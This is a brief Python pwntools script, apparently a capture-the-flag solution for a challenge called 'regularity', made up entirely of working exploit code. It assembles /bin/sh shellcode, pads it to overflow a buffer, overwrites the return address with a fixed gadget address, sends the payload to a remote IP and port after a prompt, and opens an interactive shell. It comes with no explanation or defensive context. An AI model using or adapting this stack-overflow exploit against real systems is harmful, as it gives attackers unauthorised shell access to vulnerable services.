from pwn import *
context.arch='amd64'
shellcode=shellcraft.sh()
#p=process('./regularity')
p=remote('94.237.61.242', 45303)
payload=asm(shellcode)+b'a'*(256-0x20-16)+p64(0x401041)
#input()
p.sendafter(b'days?\n',payload)
p.interactive()
